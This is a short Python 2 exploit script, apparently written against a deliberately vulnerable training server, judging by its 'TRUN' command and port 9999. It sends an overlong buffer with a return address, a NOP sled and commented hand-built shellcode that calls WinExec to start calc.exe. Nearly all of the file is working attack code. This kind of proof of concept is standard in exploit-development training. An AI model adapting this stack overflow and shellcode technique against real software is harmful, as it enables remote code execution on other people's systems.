import socket
import sys


try:
	ip = sys.argv[1]
	port = int(sys.argv[2])
except:
	print "  USAGE: python custom-payload-calc.py <IP> <PORT>"
	print "EXAMPLE: python custom-payload-calc.py 192.168.1.1 9999"
	exit()


garbage = "A" * 2006
ret = "\xAF\x11\x50\x62" 	
nop = "\x90" * 24

buf ="\x33\xc0" 		# XOR EAX EAX 	- This will zero the eax register
buf +="\x50"			# PUSH EAX	- Push the 0 in eax onto the stack. Will act as
				#		  as a null byte
buf +="\x68\x2e\x65\x78\x65"	# PUSH ".EXE"	- Push the calc.exe payload onto the stack
buf +="\x68\x63\x61\x6c\x63"	# PUSH "CALC"
buf +="\x8b\xc4"		# MOV EAX,ESP	- Move the stack ptr into the eax register
				#		  because WinExec will execute the command in eax
				#		  Thus, eax will point to calc.exe on the stack
buf +="\x6a\x01"		# PUSH 1	- Push 1 (WinExec takes two args, this is the second)
buf +="\x50"			# PUSH EAX 	- Push the address of calc.exe 
				#		  stack (stored in eax). 1st arg to WinExec.
buf +="\xBB\xFD\xe5\x90\x75"	# Move address of WinExec to EBX - found using awrin.exe
buf +="\xFF\xD3"		# CALL EBX

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
badstr = "TRUN ." + garbage + ret + nop + buf + "\r\n"

s.send(badstr)
s.close()

